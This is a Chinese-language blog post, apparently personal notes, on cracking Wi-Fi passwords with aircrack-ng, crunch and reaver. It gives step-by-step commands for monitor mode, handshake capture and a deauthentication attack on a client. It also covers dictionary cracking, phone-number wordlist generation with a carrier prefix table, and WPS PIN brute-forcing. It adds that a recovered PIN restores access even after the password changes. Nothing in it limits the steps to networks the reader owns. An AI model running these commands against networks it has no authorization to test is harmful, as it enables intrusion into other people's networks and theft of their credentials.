---
title: "无线网络安全审计工具"
date: 2022-01-07T20:00:00+08:00
draft: false
authors: ["SenZyo"]
tags: [Hack,Linux,Network,Security]
featuredImagePreview: ""
summary: aircrack-ng, crunch 和 reaver 使用笔记。
---

{{< admonition type=abstract title="总结" open=true >}}
1. 事实上利用字典穷举完全靠运气。
2. 通过爆破WPS可行性高但reaver总报错: `[!] WPS transaction failed (code: 0x04), re-trying last pin`, [解决方法](https://forum.ubuntu.org.cn/viewtopic.php?t=459198)并没有效果。
{{< /admonition >}}

## aircrack-ng

通过抓取握手包后将其破解以获取密码。

### 准备

#### 硬件

网卡芯片需要支持监听和注入, 此处用的芯片是RTL8187L。

#### 软件

1. 安装aircrack-ng: 

    ```bash
    apt install aircrack-ng
    ```

2. 查看网卡状态信息: 

    ```bash
    iwconfig
    ```

3. 关闭网卡`wlx012345678`: 

    ```bash
    ip link set wlx012345678 down
    ```

4. 重命名网卡`wlx012345678`为`wl`: 

    ```bash
    ip link set wlx012345678 name wl
    ```

5. 打开网卡`wl`: 

    ```bash
    ip link set wl up
    ```

### 监听

1. 为网卡`wl`开启监听模式: 

    ```bash
    airmon-ng start wl
    ```

2. 查看网卡状态信息: 

    ```bash
    iwconfig
    ```

    发现网卡`wl`变成了`wlmon`

3. 监听附近Wi-Fi: 

    ```bash
    airodump-ng wlmon
    ```

### 抓包

```bash
airodump-ng --channel 7 -w captured --bssid XX:XX:XX:XX:XX:XX wlmon
```

### 攻击

```bash
aireplay-ng -0 0 -a XX:XX:XX:XX:XX:XX -c 3C:CD:5D:93:A7:08 wlmon
```

### 破解

1. 关闭监听模式: 

    ```bash
    airmon-ng stop wlmon
    ```

2. 使用字典进行暴力破解: 

    ```bash
    aircrack-ng -w 桌面/dic.txt 桌面/captured-01.cap
    ```

## crunch

用来制作字典, 参考[crunch命令详解以及使用方法](https://blog.csdn.net/qq_42025840/article/details/81125584)。

### 安装

```bash
apt install crunch
```

### 例子

1. 生成8位数密码, 只包含数字: 

    ```bash
    crunch 8 8 -f /usr/share/crunch/charset.lst numeric -o num8.txt
    ```

2. 生成11位手机号: 

    ```bash
    crunch 11 11 +0123456789 -t 134%%%%%%%% -o phone134.txt
    ```

> 号码开头字段参考[手机归属-查号吧](https://www.chahaoba.com/%E6%89%8B%E6%9C%BA%E5%BD%92%E5%B1%9E)、[三大运营商手机号段](https://blog.csdn.net/lihefei_coder/article/details/81416948)

| 普通用户号段 | 中国移动                     | 中国联通      | 中国电信           |
| ------------ | ---------------------------- | ------------- | ------------------ |
| 13号段       | 134、135、136、137、138、139 | 130、131、132 | 133                |
| 14号段       | 147                          | 145           | 149                |
| 15号段       | 150、151、152、157、158、159 | 155、156      | 153                |
| 16号段       |                              | 166           |                    |
| 17号段       | 172、178                     | 171、175、176 | 173、177           |
| 18号段       | 182、183、184、187、188      | 185、186      | 180、181、189      |
| 19号段       | 195、197、198                | 196           | 190、191、193、199 |

还可以设置为每次生成的文件大小为20M: 

```bash
crunch 11 11 +0123456789 -t 134%%%%%%%% -b 20mib -o START 
```

## reaver

{{< admonition type=quote title="参考链接" open=true >}}
1. [Kali如何使用Reaver破解Wi-Fi网络的WPA/WPA2密码](https://blog.csdn.net/weixin_40586270/article/details/81280928)
2. [利用 reaver 进行无线安全审计](http://blkstone.github.io/2015/08/19/reaver-tutorial/)
{{< /admonition >}}

通过爆破WPS的PIN来达到目的。

1. 为网卡`wl`开启监听模式: 

    ```bash
    airmon-ng start wl
    ```

2. 监听附近Wi-Fi: 

    ```bash
    airodump-ng wlmon
    ```

3. 找出开启了WPS功能、可以使用PIN登录的路由器: 

    ```bash
    wash -i wlmon
    ```

    > ENC需要为WPA或WPA2, AUTH需要为PSK

4. 攻击: 

    ```bash
    reaver -i wlmon -c 7 -b XX:XX:XX:XX:XX:XX -S -d 9 -t 9 -vv
    ```

5. 获取到PIN后, 以后即便路由器更换了密码, 也可以很迅速地通过PIN重新获得新密码。举例: 

    ```bash
    reaver -i wlmon -b xx:xx:xx:xx:xx:xx -p 12345670
    ```
